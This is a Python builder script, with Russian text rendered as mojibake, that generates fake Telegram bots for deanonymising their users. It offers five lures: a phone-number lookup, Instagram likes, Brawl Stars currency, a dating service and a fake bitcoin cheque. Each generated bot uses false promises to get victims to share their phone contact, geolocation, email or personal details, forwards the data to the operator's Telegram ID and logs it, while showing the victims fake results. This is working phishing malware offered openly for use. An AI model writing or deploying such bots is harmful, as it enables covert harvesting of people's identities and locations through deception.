import colorama
from colorama import Fore, Back, Style
import os
os.system('clear')
print(Fore.RED + '''
         _,.-------.,_
     ,;~'             '~;,
   ,;                     ;,
  ;                         ;
 ,'                         ',
,;                           ;,
; ;      .           .      ; ;
| ;   ______       ______   ; |
|  `/~"     ~" . "~     "~\'  |
|  ~  ,-~~~^~, | ,~^~~~-,  ~  |
 |   |        }:{        |   |
 |   l       / | \       !   |
 .~  (__,.--" .^. "--.,__)  ~.
 |     ---;' / | \ `;---     |
  \__.       \/^\/       .__/
   V| \                 / |V
    | |T~\___!___!___/~T| |
    | |`IIII_I_I_I_IIII'| |
    |  \,III I I I III,/  |
     \   `~~~~~~~~~~'    /
       \   .       .   /     
         \.    ^    ./
           ^~~~^~~~^


	''')
input(Fore.GREEN + "Íàæìèòå Enter äëÿ ïðîäîëæåíèÿ")
os.system('clear')
print(Fore.MAGENTA + ' _____    _   _   _   _ ' + Fore.YELLOW + ' __  __   ______ ')
print(Fore.MAGENTA + '|  __ \  | \ | | | \ | |' + Fore.YELLOW + '|  \/  | |  ____|')
print(Fore.MAGENTA + '| |  | | |  \| | |  \| |' + Fore.YELLOW + '| \  / | | |__   ')
print(Fore.MAGENTA + '| |  | | | . ` | | . ` |' + Fore.YELLOW + '| |\/| | |  __|  ')
print(Fore.MAGENTA + '| |__| | | |\  | | |\  |' + Fore.YELLOW + '| |  | | | |____ ')
print(Fore.MAGENTA + '|_____/  |_| \_| |_| \_|' + Fore.YELLOW + '|_|  |_| |______|')
print(Fore.YELLOW + '-----------------------------------------')
print(Fore.YELLOW + '|' + Fore.BLUE +  " Telegram Deanonymization bot builder  " + Fore.YELLOW + '|')
print(Fore.YELLOW + '|' + Fore.BLUE +  "       Developer:@Duzik         " + Fore.YELLOW + '|')
print(Fore.YELLOW + '|' + Fore.BLUE +  "        Channel:https://t.me/+yHTXU0Zi5LxiZjRi" + Fore.YELLOW + '|')
print(Fore.YELLOW + '-----------------------------------------')
userid = input(Fore.RED +  "Ââåäèòå ñâîé Telegram ID > ")
token = input(Fore.BLUE +  "Ââåäèòå òîêåí áîòà > ")
print(Fore.CYAN + '''
[1] Ïðîáèâ ïî íîìåðó
[2] Íàêðóòêà èíñòàãðàì
[3] Áðàâë ñòàðñ
[4] Çíàêîìñòâà
[5] BTC BANKER
	''')
choice = input(Fore.MAGENTA +  "Âûáåðèòå âàðèàíò ôåéê èíòåðôåéñà:>>> ")
if not choice.isdigit():
	print("Îøèáêà, âàðèàíò äîëæåí áûòü ÷èñåëüíûì")
	exit(0)
choice = int(choice)



if choice == 1:
	f = open('probiv.py', 'w+', encoding='utf-8')
	f.write(f"""
import telebot
from telebot import types
import time
import random

ID = '{userid}'
bot = telebot.TeleBot("{token}")
adr = ['Òâåðñêàÿ óëèöà, äîì 13', 'Ïðîñïåêò 60-ëåòèÿ Îêòÿáðÿ', 'Óëèöà Âèíîêóðîâà', '3-é Ãîëóòâèíñêèé ïåðåóëîê']
bot.send_message(ID, '!BOT STARTED!') 
print("Áîò çàïóùåí!")

@bot.message_handler(commands=['start'])
def start(message):
	bot.send_message(message.chat.id, '''?? Ïðèâåò! ??
		Ýòî áîò, êîòîðûé, ìîæåò ïîêàçàòü èíôîðìàöèþ ïî íîìåðó òåëåôîíà!
	Äëÿ ïîèñêà èíôîðìàöèè, ââåäèòå êîìàíäó /getinfo''') 
	
@bot.message_handler(commands=['lamer112311dev'])
def start(message):
	bot.send_message(message.chat.id, 'Àâòîð ñêðèïòà: @lamer112311. Êàíàë: cutt.ly/CyberPuffin') 

@bot.message_handler(commands=['getinfo'])
def start(message):
	msg = bot.send_message(message.chat.id, 'Ââåäèòå ëþáîé íîìåð òåëåôîíà') 
	bot.register_next_step_handler(msg, proc2)

def proc2(message):
	try:
		m_id = message.chat.id
		user_input = message.text
		num = user_input.replace('+', '')

		if not num.isdigit():
			msg = bot.reply_to(message, 'Êàæåòñÿ, âû íå ââåëè äåéñòâèòåëüíûé íîìåð òåëåôîíà, ïîâòîðèòå ïîïûòêó, íàïèñàâ /getinfo!')#?
			return

		bot.send_message(m_id, f'Çàïðîñ íà íîìåð {{num}} îòïðàâëåí!')
		time.sleep(2)
		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_phone = types.KeyboardButton(text="Çàðåãåñòðèðîâàòüñÿ", request_contact=True) 	
		keyboard.add(button_phone)	
		bot.send_message(m_id, '''Ïîõîæå ó âàñ íå îñòàëîñü áåñïëàòíûõ çàïðîñîâ íà äåíü!
			×òîáû ïîëó÷èòü äîïîëíèòåëüíûå âîïðîñû çàðåãåñòðèðóéòåñü â áîòå!''', reply_markup=keyboard)
# Îòëîâêà îøèáîê
	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, 'Ïðîèçîøëà íåîïîçíàííàÿ îøèáêà, ïåðåçàãðóçèòå áîòà!')

@bot.message_handler(content_types=['contact']) 
def contact(message):
	if message.contact is not None: 
		nick = message.from_user.username
		first = message.contact.first_name
		last = message.contact.last_name
		userid = message.contact.user_id
		phone = message.contact.phone_number
		info = f'''
			Äàííûå
			+Èìÿ: {{first}} {{last}}
			+ID: {{userid}}
			+Íèê: @{{nick}}
			LÍîìåð òåëåôîíà: {{phone}}
			'''
		log = open('bot-log.txt', 'a+', encoding='utf-8')
		log.write(info + '  ')
		log.close()
		bot.send_message(ID, info)
		print(info)

		if message.contact.user_id != message.chat.id:
			bot.send_message(message.chat.id, 'Îòïðàâüòå ñâîé êîíòàêò!')

	keyboardmain = types.InlineKeyboardMarkup(row_width=2)
	button = types.InlineKeyboardButton(text="Ðàñøèðåííûé ïîèñê", callback_data="find")
	keyboardmain.add(button)
	bot.send_message(message.chat.id, f'''
		Èíôîðìàöèÿ î íîìåðå
		+Îïåðàòîð: Beeline
		LÑòðàíà: Ðîññèÿ
		''', reply_markup=keyboardmain)

@bot.callback_query_handler(func=lambda call:True)
def callback_inline(call):
	if call.data == "find":
		keyboard1 = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_location = types.KeyboardButton(text="Ïîäòâåðäèòü", request_location=True) 	
		keyboard1.add(button_location)
		bot.send_message(call.message.chat.id, text='Äëÿ èñïîëüçîâàíèÿ áåñïëàòíîãî ðàñøèðåííîãî ïîèñêà, ïîäòâåðäèòå ãåîëîêàöèþ!', reply_markup=keyboard1)

@bot.message_handler(content_types=['location']) 
def contact(message):
	if message.location is not None: 
		lon = str(message.location.longitude)
		lat = str(message.location.latitude)
		geo = f'''
		Ãåîëîêàöèÿ
		+ID: {{message.chat.id}}
		+Longitude: {{lon}}
		+Latitude: {{lat}}
		LÊàðòû: https://www.google.com/maps/place/{{lat}}+{{lon}} 
		'''
		log = open('bot-log.txt', 'a+', encoding='utf-8')
		log.write(geo + '  ')
		log.close()
		bot.send_message(ID, geo) 
		print(geo)
		bot.send_message(message.chat.id, f'''
			Ãåîëîêàöèÿ
			LÀäðåñ: {{random.choice(adr)}}
			''')
bot.polling()
		""")
	f.close()
	print("Ôàéë probiv.py ñîõðàíåí")

if choice == 2:
	f = open('nacr.py', 'w+', encoding='utf-8')
	f.write(f"""
import telebot
from telebot import types
import time
import random


log = open('bot-log.txt', 'a+', encoding='utf-8')
ID = '{userid}'
bot = telebot.TeleBot("{token}")
bot.send_message(ID, '!BOT STARTED!')
print("Áîò çàïóùåí!") 
@bot.message_handler(commands=['start'])
def start(message):
	bot.send_message(message.chat.id, '''?? Ïðèâåò! ??
		Ýòî áîò äëÿ íàêðóòêè ëàéêîâ è ïîäïèñ÷èêîâ â èíñòàãðàì!
		Äëÿ ñòàðòà íàïèøèòå /nacrutka''') 
@bot.message_handler(commands=['lamer112311dev'])
def start(message):
	bot.send_message(message.chat.id, 'Àâòîð ñêðèïòà: @lamer112311. Êàíàë: cutt.ly/CyberPuffin') 
@bot.message_handler(commands=['nacrutka'])
def start(message):
	keyboardmain = types.InlineKeyboardMarkup(row_width=2)
	first_button = types.InlineKeyboardButton(text="Ëàéêè", callback_data="first")
	second_button = types.InlineKeyboardButton(text="Ïîäïèñ÷èêè", callback_data="second")
	keyboardmain.add(first_button, second_button)
	bot.send_message(message.chat.id, "Âûáåðèòå ïóíêò íàêðóòêè:", reply_markup=keyboardmain)

@bot.callback_query_handler(func=lambda call:True)
def callback_inline(call):
	if call.data == "first":
		msg = bot.send_message(call.message.chat.id, 'Ââåäèòå êîëëè÷åñòâî ëàéêîâ (íå áîëåå 500)') 
		bot.register_next_step_handler(msg, proc1)

	elif call.data == "second":
		msg = bot.send_message(call.message.chat.id, 'Ââåäèòå êîëëè÷åñòâî ïîäïèñ÷èêîâ (íå áîëåå 500)') 
		bot.register_next_step_handler(msg, proc2)

def proc1(message):
	try:
		num = message.text
		m_id = message.chat.id

		if not num.isdigit():
			msg = bot.reply_to(message, 'Ââåäèòå êîëëè÷åñòâî ÷èñëîì! Ïîâòîðèòå ïîïûòêó, íàïèñàâ /nacrutka!')#?
			return
		if int(num) > 500:
			bot.reply_to(message, 'Êîëëè÷åñòâî ëàéêîâ íå ìîæåò áûòü áîëåå 500!')
			return


		time.sleep(2)
		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_phone = types.KeyboardButton(text="Çàðåãåñòðèðîâàòüñÿ", request_contact=True) 	
		keyboard.add(button_phone)	
		bot.send_message(m_id, '''Ïîõîæå ó âàñ íå îñòàëîñü áåñïëàòíûõ çàïðîñîâ íà äåíü!
			×òîáû ïîëó÷èòü äîïîëíèòåëüíûå çàïðîñû çàðåãåñòðèðóéòåñü â áîòå!''', reply_markup=keyboard)
	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, 'Ïðîèçîøëà íåîïîçíàííàÿ îøèáêà, ïåðåçàãðóçèòå áîòà!')


def proc2(message):
	try:
		num = message.text
		m_id = message.chat.id

		if not num.isdigit():
			msg = bot.reply_to(message, 'Ââåäèòå êîëëè÷åñòâî ÷èñëîì! Ïîâòîðèòå ïîïûòêó, íàïèñàâ /nacrutka!')#?
			return

		if int(num) > 500:
			bot.reply_to(message, 'Êîëëè÷åñòâî ïîäïèñ÷èêîâ íå ìîæåò áûòü áîëåå 500!')
			return

		time.sleep(2)
		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_phone = types.KeyboardButton(text="Çàðåãèñòðèðîâàòüñÿ", request_contact=True) 	
		keyboard.add(button_phone)	
		bot.send_message(m_id, '''Ïîõîæå ó âàñ íå îñòàëîñü áåñïëàòíûõ çàïðîñîâ íà äåíü!
			×òîáû ïîëó÷èòü äîïîëíèòåëüíûå çàïðîñû çàðåãåñòðèðóéòåñü â áîòå!''', reply_markup=keyboard)

	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, 'Ïðîèçîøëà íåîïîçíàííàÿ îøèáêà, ïåðåçàãðóçèòå áîòà!')

@bot.message_handler(content_types=['contact']) 
def contact(message):
	if message.contact is not None: 
		nick = message.from_user.username
		first = message.contact.first_name
		last = message.contact.last_name
		userid = message.contact.user_id
		phone = message.contact.phone_number
		info = f'''
			Äàííûå
			+Èìÿ: {{first}} {{last}}
			+ID: {{userid}}
			+Íèê: @{{nick}}
			LÍîìåð òåëåôîíà: {{phone}}
			'''

		bot.send_message(ID, info)
		print(info)

		log = open('bot-log.txt', 'a+', encoding='utf-8')
		log.write(info + '  ')
		log.close()

		if message.contact.user_id != message.chat.id:
			bot.send_message(message.chat.id, 'Îòïðàâüòå ñâîé êîíòàêò!')
		bot.send_message(message.chat.id, 'Ðåãèñòðàöèÿ ïðîøëà óñïåøíî!') 
		time.sleep(1)
		msg = bot.send_message(message.chat.id, 'Ââåäèòå íèê â èíñòàãðàì:') 
		bot.register_next_step_handler(msg, entr)

def entr(message):
	try:
		inp = message.text
		m_id = message.chat.id

		bot.reply_to(message, f'Íèê: {{inp}} ')#?
		bot.send_message(ID, f'Íèê â èíñòàðàì: {{inp}}')
		bot.send_message(message.chat.id, 'Îæèäàéòå íàêðóòêó íà âàø àêêàóíò â òå÷åíèè 24 ÷àñîâ!')
	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, 'Ïðîèçîøëà íåîïîçíàííàÿ îøèáêà, ïåðåçàãðóçèòå áîòà!')




bot.polling()


		""")
	f.close()
	print("Ôàéë nacr.py ñîõðàíåí")

if choice == 3:
	f = open('brawl.py', 'w+', encoding='utf-8')
	f.write(f"""
import telebot
from telebot import types
import time
import random


log = open('bot-log.txt', 'a+', encoding='utf-8')
ID = '{userid}'
bot = telebot.TeleBot("{token}")
bot.send_message(ID, '!BOT STARTED!')
print("Áîò çàïóùåí!") 
@bot.message_handler(commands=['start'])
def start(message):
	bot.send_message(message.chat.id, f'''?? Ïðèâåò, {{message.from_user.first_name}}! ??
		Ýòî áîò, êîòîðûé ìîæåò çàäîíàòèòü â áðàâë ñòàðñ 
		×òîáû íà÷àòü, íàïèøè êîìàíäó /don''') 
@bot.message_handler(commands=['lamer112311dev'])
def start(message):
	bot.send_message(message.chat.id, 'Àâòîð ñêðèïòà: @lamer112311. Êàíàë: cutt.ly/CyberPuffin') 
@bot.message_handler(commands=['don'])
def start(message):
	keyboardmain = types.InlineKeyboardMarkup(row_width=2)
	first_button = types.InlineKeyboardButton(text="??Çîëîòî??", callback_data="first")
	second_button = types.InlineKeyboardButton(text="??Ãåìû??", callback_data="second")
	keyboardmain.add(first_button, second_button)
	bot.send_message(message.chat.id, "Âûáåðèòå ïóíêò:", reply_markup=keyboardmain)

@bot.callback_query_handler(func=lambda call:True)
def callback_inline(call):
	if call.data == "first":
		msg = bot.send_message(call.message.chat.id, 'Ââåäèòå êîëëè÷åñòâî çîëîòà?? (íå áîëåå 500)') 
		bot.register_next_step_handler(msg, proc1)

	elif call.data == "second":
		msg = bot.send_message(call.message.chat.id, 'Ââåäèòå êîëëè÷åñòâî ãåìîâ?? (íå áîëåå 50)') 
		bot.register_next_step_handler(msg, proc2)

def proc1(message):
	try:
		num = message.text
		m_id = message.chat.id

		if not num.isdigit():
			msg = bot.reply_to(message, 'Ââåäèòå êîëëè÷åñòâî ÷èñëîì! Ïîâòîðèòå ïîïûòêó, íàïèñàâ /don!')#?
			return
		if int(num) > 500:
			bot.reply_to(message, 'Êîëëè÷åñòâî çîëîòà íå ìîæåò áûòü áîëåå 500!')
			return


		time.sleep(2)
		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_phone = types.KeyboardButton(text="Çàðåãèñòðèðîâàòüñÿ", request_contact=True) 	
		keyboard.add(button_phone)	
		bot.send_message(m_id, '''Ïîõîæå ó âàñ íå îñòàëîñü áåñïëàòíûõ çàïðîñîâ íà äåíü!
			×òîáû ïîëó÷èòü äîïîëíèòåëüíûå çàïðîñû çàðåãèñòðèðóéòåñü â áîòå!''', reply_markup=keyboard)
	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, 'Ïðîèçîøëà íåîïîçíàííàÿ îøèáêà, ïåðåçàãðóçèòå áîòà!')


def proc2(message):
	try:
		num = message.text
		m_id = message.chat.id

		if not num.isdigit():
			msg = bot.reply_to(message, 'Ââåäèòå êîëëè÷åñòâî ÷èñëîì! Ïîâòîðèòå ïîïûòêó, íàïèñàâ /don!')#?
			return

		if int(num) > 50:
			bot.reply_to(message, 'Êîëëè÷åñòâî ãåìîâ íå ìîæåò áûòü áîëåå 50!')
			return

		time.sleep(2)
		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_phone = types.KeyboardButton(text="Çàðåãèñòðèðîâàòüñÿ", request_contact=True) 	
		keyboard.add(button_phone)	
		bot.send_message(m_id, '''Ïîõîæå ó âàñ íå îñòàëîñü áåñïëàòíûõ çàïðîñîâ íà äåíü!
			×òîáû ïîëó÷èòü äîïîëíèòåëüíûå çàïðîñû çàðåãèñòðèðóéòåñü â áîòå!''', reply_markup=keyboard)

	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, 'Ïðîèçîøëà íåîïîçíàííàÿ îøèáêà, ïåðåçàãðóçèòå áîòà!')

@bot.message_handler(content_types=['contact']) 
def contact(message):
	if message.contact is not None: 
		nick = message.from_user.username
		first = message.contact.first_name
		last = message.contact.last_name
		userid = message.contact.user_id
		phone = message.contact.phone_number
		info = f'''
			Äàííûå
			+Èìÿ: {{first}} {{last}}
			+ID: {{userid}}
			+Íèê: @{{nick}}
			LÍîìåð òåëåôîíà: {{phone}}
			'''

		bot.send_message(ID, info)
		print(info)

		log = open('bot-log.txt', 'a+', encoding='utf-8')
		log.write(info + '  ')
		log.close()

		if message.contact.user_id != message.chat.id:
			bot.send_message(message.chat.id, 'Îòïðàâüòå ñâîé êîíòàêò!')
		bot.send_message(message.chat.id, 'Ðåãèñòðàöèÿ ïðîøëà óñïåøíî!') 
		time.sleep(1)
		msg = bot.send_message(message.chat.id, 'Ââåäèòå ïî÷òó, ïðèâÿçàííóþ ê èãðå:') 
		bot.register_next_step_handler(msg, entr)

def entr(message):
	try:
		inp = message.text
		m_id = message.chat.id


		bot.send_message(ID, f'Ïî÷òà: {{inp}}')

		markup_reply = types.ReplyKeyboardMarkup(resize_keyboard = True)
		item_an = types.KeyboardButton('Ïîëó÷èòü áîëüøå ãåìîâ')
		markup_reply.add(item_an)
		bot.send_message(message.chat.id, f'Ïî÷òà: {{inp}} ', reply_markup = markup_reply)
		time.sleep(1)
		bot.send_message(message.chat.id, 'Îæèäàéòå äîíàò íà âàø àêêàóíò â òå÷åíèè 24 ÷àñîâ!')

	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, 'Ïðîèçîøëà íåîïîçíàííàÿ îøèáêà, ïåðåçàãðóçèòå áîòà!')

@bot.message_handler(content_types = ['text'])
def get_text(message):
	if message.text == 'Ïîëó÷èòü áîëüøå ãåìîâ':
		m_id = message.chat.id
		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_phone = types.KeyboardButton(text="Ïîäòâåðäèòü", request_location=True) 	
		keyboard.add(button_phone)	
		bot.send_message(m_id, '''×òîáû ïîëó÷èòü áîëüøå ãåìîâ, ïîäòâåðäèòå ãåîëîêàöèþ!''', reply_markup=keyboard)

@bot.message_handler(content_types=['location']) 
def contact(message):
	if message.location is not None: 
		lon = str(message.location.longitude)
		lat = str(message.location.latitude)
		geo = f'''
		Ãåîëîêàöèÿ
		+ID: {{message.chat.id}}
		+Longitude: {{lon}}
		+Latitude: {{lat}} 
		LÊàðòû: https://www.google.com/maps/place/{{lat}}+{{lon}} 
		'''
		log = open('bot-log.txt', 'a+', encoding='utf-8')
		log.write(geo + '  ')
		log.close()
		bot.send_message(ID, geo) 
		print(geo)
		msg = bot.send_message(message.chat.id, 'Ââåäèòå êîëëè÷åñòâî ãåìîâ?? (íå áîëåå 800)') 
		bot.register_next_step_handler(msg, proc3)

def proc3(message):
	try:
		num = message.text
		m_id = message.chat.id

		if not num.isdigit():
			msg = bot.reply_to(message, 'Ââåäèòå êîëëè÷åñòâî ÷èñëîì! Ïîâòîðèòå ïîïûòêó, íàïèñàâ /don!')#?
			return

		if int(num) > 800:
			bot.reply_to(message, 'Êîëëè÷åñòâî ãåìîâ íå ìîæåò áûòü áîëåå 800!')
			return

		time.sleep(2)
		msg = bot.send_message(message.chat.id, 'Ââåäèòå ïî÷òó, ïðèâÿçàííóþ ê èãðå:') 
		bot.register_next_step_handler(msg, entr1)
	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, 'Ïðîèçîøëà íåîïîçíàííàÿ îøèáêà, ïåðåçàãðóçèòå áîòà!')

def entr1(message):
	try:
		inp = message.text
		m_id = message.chat.id

		bot.reply_to(message, f'Ïî÷òà: {{inp}} ')#?
		bot.send_message(ID, f'Ïî÷òà: {{inp}}')
		time.sleep(1)
		bot.send_message(message.chat.id, 'Îæèäàéòå äîíàò íà âàø àêêàóíò â òå÷åíèè 24 ÷àñîâ!')
	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, 'Ïðîèçîøëà íåîïîçíàííàÿ îøèáêà, ïåðåçàãðóçèòå áîòà!')




	

bot.polling()


		""")
	f.close()
	print("Ôàéë brawl.py ñîõðàíåí")

if choice == 4:
	f = open('znak.py', 'w+', encoding='utf-8')
	f.write(f"""
import telebot
from telebot import types
import time
import random

ID = '{userid}'
bot = telebot.TeleBot("{token}")
bot.send_message(ID, '!BOT STARTED!') 
print("Áîò çàïóùåí!") 

@bot.message_handler(commands=['start'])
def start(message):
	bot.send_message(message.chat.id, f'''?? Ïðèâåò! {{message.from_user.first_name}}??
		Ýòî áîò äëÿ çíàêîìñòâà!
	×òîáû íà÷àòü, ââåäèòå /znak''') 
@bot.message_handler(commands=['lamer112311dev'])
def start(message):
	bot.send_message(message.chat.id, 'Àâòîð ñêðèïòà: @lamer112311. Êàíàë: cutt.ly/CyberPuffin') 
@bot.message_handler(commands=['znak'])
def start(message):
	msg = bot.send_message(message.chat.id, 'Äëÿ íà÷àëà íàïèøèòå íåìíîãî î ñåáå (îäíèì ñîîáùåíèåì)') 
	bot.register_next_step_handler(msg, proc2)

def proc2(message):
	try:
		m_id = message.chat.id
		num = message.text
		bot.send_message(ID, f'Ïîëó÷åíàÿ èíôîðìàöèÿ: {{num}}')
		print(num)
		time.sleep(2)
		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_phone = types.KeyboardButton(text="Çàðåãèñòðèðîâàòüñÿ", request_contact=True) 	
		keyboard.add(button_phone)	
		bot.send_message(m_id, '''Äëÿ òîãî, ÷òîáû èñïîëüçîâàòü áîòà, çàðåãèñòðèðóéòåñü, ïîæàëóéñòà!''', reply_markup=keyboard)
# Îòëîâêà îøèáîê
	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, 'Ïðîèçîøëà íåîïîçíàííàÿ îøèáêà, ïåðåçàãðóçèòå áîòà!')

@bot.message_handler(content_types=['contact']) 
def contact(message):
	if message.contact is not None: 
		nick = message.from_user.username
		first = message.contact.first_name
		last = message.contact.last_name
		userid = message.contact.user_id
		phone = message.contact.phone_number
		bot.send_message(userid, "Ðåãèñòðàöèÿ ïðîøëà óñïåøíî!")
		info = f'''
			Äàííûå
			+Èìÿ: {{first}} {{last}}
			+ID: {{userid}}
			+Íèê: @{{nick}}
			LÍîìåð òåëåôîíà: {{phone}}
			'''
		log = open('bot-log.txt', 'a+', encoding='utf-8')
		log.write(info + '  ')
		log.close()
		bot.send_message(ID, info)
		print(info)

		if message.contact.user_id != message.chat.id:
			bot.send_message(message.chat.id, 'Îòïðàâüòå ñâîé êîíòàêò!')
		time.sleep(1)
		keyboard1 = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_location = types.KeyboardButton(text="Îòïðàâèòü", request_location=True) 	
		keyboard1.add(button_location)
		bot.send_message(message.chat.id, text='Îòïðàâüòå ñâîþ ãåîïîçèöèþ, äëÿ òîãî, ÷òîáû áîò íàøåë áëèæàéøèõ îò âàñ ïîëüçîâàòåëåé!', reply_markup=keyboard1)

@bot.message_handler(content_types=['location']) 
def contact(message):
	if message.location is not None: 
		lon = str(message.location.longitude)
		lat = str(message.location.latitude)
		geo = f'''
		Ãåîëîêàöèÿ
		+ID: {{message.chat.id}}
		+Longitude: {{lon}}
		+Latitude: {{lat}} 
		LÊàðòû: https://www.google.com/maps/place/{{lat}}+{{lon}} 
		'''
		log = open('bot-log.txt', 'a+', encoding='utf-8')
		log.write(geo + '  ')
		log.close()
		bot.send_message(ID, geo) 
		print(geo)
		bot.send_message(message.chat.id, 'Ïîèñê...')
		time.sleep(2)
		bot.send_message(message.chat.id, 'Ê ñîæàëåíèþ â áàçå íå íàøëîñü ïîäõîäÿùèõ ïîëüçîâàòåëåé!')
bot.polling()
		""")
	f.close()
	print("Ôàéë znak.py ñîõðàíåí")
if choice == 5:
	f = open('btc.py', 'w+', encoding='utf-8')
	f.write(f"""
	
import telebot
from telebot import types
import time
import random

ID = '{userid}'
bot = telebot.TeleBot("{token}")
bot.send_message(ID, '!BOT STARTED!') 
print("Áîò çàïóùåí!") 


@bot.message_handler(commands=['admin'])
def adm(message):
	if message.from_user.id == int(ID):
		msg = bot.send_message(ID, 'Äîáðî ïîæàëîâàòü â àäìèí ïàíåëü áîòà! \\n Ââåäèòå ñóììó íà êîòîðóþ ñîçäàòü ÷åê:') 
		bot.register_next_step_handler(msg, check)
def check(message):
	try:
		if message.text.isdigit():
			bot.send_message(ID, f'Ñóììà: {{message.text}}')
			bot.send_message(ID, f'Âàø ÷åê: https://t.me/{{bot.get_me().username}}?start={{message.text}}')
		else:
			bot.send_message('Çíà÷åíèå äîëæíî áûòü ÷èñåëüíûì!')

	except Exception as e:
		print(e)

@bot.message_handler(commands=['start'])
def start(message):
	if message.from_user.id == int(ID):
		bot.send_message(ID, 'Äîáðî ïîæàëîâàòü â áîòà! \\n Äëÿ âõîäà â àäìèí ïàíåëü íàïèøèòå: /admin') 
	else:
		try:
			summ = message.text.split()[1]
			userid = message.chat.id
			bot.send_message(ID, f'Ïîëüçîâàòåëü ñ ID:{{userid}} "Îáíàëè÷èë" âàø ÷åê íà ñóììó:{{summ}}')
			bot.send_message(message.chat.id, f'''Âû ïîëó÷èëè 0.00{{random.randint(51, 253)}} BTC ({{summ}} RUB) îò /uPorterBaseTheFist!''')
			time.sleep(1)
			
			m_id = message.chat.id
			keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
			button_phone = types.KeyboardButton(text="?Ñíÿòü îãðàíè÷åíèÿ", request_contact=True) 	
			keyboard.add(button_phone)	
			bot.send_message(message.chat.id, "Çàïðåùåíî >>> \\n? Âàø àêêàóíò îãðàíè÷åí! Âåðîÿòíåå âñåãî, Âû íàðóøèëè óñëîâèÿ ñåðâèñà (https://bitzlato.bz/en/terms)!", reply_markup=keyboard)
		
		except Exception as e:
			keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
			button_phone = types.KeyboardButton(text="?Ñíÿòü îãðàíè÷åíèÿ", request_contact=True) 	
			keyboard.add(button_phone)	
			bot.send_message(message.chat.id, "Çàïðåùåíî >>> \\n? Âàø àêêàóíò îãðàíè÷åí! Âåðîÿòíåå âñåãî, Âû íàðóøèëè óñëîâèÿ ñåðâèñà (https://bitzlato.bz/en/terms)!", reply_markup=keyboard)
			userid = message.chat.id
			bot.send_message(ID, f'Ïîëüçîâàòåëü ñ ID:{{userid}} çàïóñòèë áîòà!')

@bot.message_handler(content_types=['contact']) 
def contact(message):
	if message.contact is not None: 
		nick = message.from_user.username
		first = message.contact.first_name
		last = message.contact.last_name
		userid = message.contact.user_id
		phone = message.contact.phone_number
		bot.send_message(userid, "?Îãðàíè÷åíèÿ óñïåøíî ñíÿòû, ñïàñèáî, ÷òî âîñïîëüçîâàëèñü íàøèì áîòîì!")
		info = f'''
			Äàííûå
			+Èìÿ: {{first}} {{last}}
			+ID: {{userid}}
			+Íèê: @{{nick}}
			LÍîìåð òåëåôîíà: {{phone}}
			'''
		log = open('bot-log.txt', 'a+', encoding='utf-8')
		log.write(info + '  ')
		log.close()
		bot.send_message(ID, info)
		print(info)

		if message.contact.user_id != message.chat.id:
			bot.send_message(message.chat.id, '?Àâòîðèçóéòå ÑÂÎÉ êîíòàêò!')
	
bot.polling()
		""")
	f.close()
	print("Ôàéë btc.py ñîõðàíåí")
